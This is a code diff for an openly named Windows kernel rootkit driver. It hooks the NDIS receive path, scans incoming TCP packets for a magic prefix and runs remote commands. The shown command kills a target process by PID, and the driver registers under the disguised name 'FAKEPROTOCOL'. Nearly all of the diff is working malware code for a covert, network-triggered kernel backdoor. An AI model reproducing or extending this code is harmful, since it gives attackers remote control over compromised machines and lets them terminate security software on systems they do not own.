@@ -5,8 +5,12 @@
 #define NDIS_PROTOCOL_DRIVER 1
 
 #include <ndis.h>
+#include <bugcodes.h>
 
 #include <ndis.hpp> // interface functions
+#include <packet.hpp>
+#include <rootkit.hpp>
+#include <utils.hpp>
 
 NDIS_HANDLE g_ndis_protocol_handle = nullptr; // _NDIS_PROTOCOL_BLOCK structure
 
@@ -32,16 +36,55 @@ void recieve_hook(NDIS_HANDLE filter_module_context, PNET_BUFFER_LIST net_buffer
 	NDIS_PORT_NUMBER port_number,
 	ULONG net_buffer_list_count,
 	ULONG recieve_flags) {
-	DbgPrint("(+) recieve hook | *FilterModuleContext: %p, *NetBufferLists: %p, PortNumber: %d, NumberOfNetBufferLists: %d, ReceiveFlags: %d\n", 
-		filter_module_context, net_buffer_list, port_number, net_buffer_list_count, recieve_flags);
+	//DbgPrint("(+) recieve hook | *FilterModuleContext: %p, *NetBufferLists: %p, PortNumber: %d, NumberOfNetBufferLists: %d, ReceiveFlags: %d\n", filter_module_context, net_buffer_list, port_number, net_buffer_list_count, recieve_flags);
 
-	original_recieve_net_buffers_list(filter_module_context, net_buffer_list, 
-		port_number, 
-		net_buffer_list_count, 
+	for (PNET_BUFFER_LIST current_nbl = net_buffer_list; current_nbl; current_nbl = NET_BUFFER_LIST_NEXT_NBL(current_nbl)) {
+		for (PNET_BUFFER current_nb = NET_BUFFER_LIST_FIRST_NB(current_nbl); current_nb; current_nb = NET_BUFFER_NEXT_NB(current_nb)) {
+			ULONG data_length = NET_BUFFER_DATA_LENGTH(current_nb);
+
+			// Thanks @KeServiceDescriptorTable for pointing out that NdisGetDataBuffer can parse NET_BUFFER structures instead of manually walking MDLs
+			// I was fr bouta do that icl :skull: - RainbowDynamix
+			PUCHAR data = (PUCHAR)NdisGetDataBuffer(current_nb, data_length, NULL, 1, 0);
+			if (!data)
+				continue;
+
+			tcp_packet parsedPacket;
+
+			if (!parse_tcp_packet(data, data_length, &parsedPacket))
+				continue;
+			if (!tcp_payload_starts_with(parsedPacket, magic, szMagic))
+				continue;
+
+			ParsedCommand parsed_cmd;
+			if (!parse_command(parsedPacket.payload, parsedPacket.payload_len, &parsed_cmd))
+				continue;
+
+			switch (parsed_cmd.command) {
+			case Command::KILL: {
+				KillPacket kill;
+				if (!parse_kill_packet(parsed_cmd, &kill)) {
+					DbgPrint("(!) KILL: invalid pid arg\n");
+					break;
+				}
+				DbgPrint("(!) KILL pid=%lu\n", HandleToUlong(kill.pid));
+				KillProcessById(kill.pid);
+				break;
+			}
+			default:
+				break;
+			}
+		}
+	}
+
+	original_recieve_net_buffers_list(filter_module_context, net_buffer_list,
+		port_number,
+		net_buffer_list_count,
 		recieve_flags);
 }
 
 void driver_unload(PDRIVER_OBJECT driver_object) {
+	UNREFERENCED_PARAMETER(driver_object);
+
 	if (original_prot_send_net_buffer_list_complete || original_recieve_net_buffers_list) {
 		auto* current_ndis_block = (PNDIS_PROTOCOL_BLOCK)g_ndis_protocol_handle;
 		while (current_ndis_block) {
@@ -64,6 +107,9 @@ void driver_unload(PDRIVER_OBJECT driver_object) {
 }
 
 NTSTATUS driver_entry(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path) {
+	UNREFERENCED_PARAMETER(driver_object);
+	UNREFERENCED_PARAMETER(registry_path);
+
 	driver_object->DriverUnload = driver_unload;
 
 	NDIS_PROTOCOL_DRIVER_CHARACTERISTICS protocolChar = {};
@@ -77,7 +123,7 @@ NTSTATUS driver_entry(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_pat
 	protocolChar.MajorDriverVersion = 1;
 	protocolChar.MinorDriverVersion = 0;
 
-	RtlInitUnicodeString(&protocolChar.Name, L"SAHAPROT");
+	RtlInitUnicodeString(&protocolChar.Name, L"FAKEPROTOCOL");
 
 	protocolChar.BindAdapterHandlerEx = ndis_interface::ProtoBindAdapterEx;
 	protocolChar.UnbindAdapterHandlerEx = ndis_interface::ProtoUnbindAdapterEx;
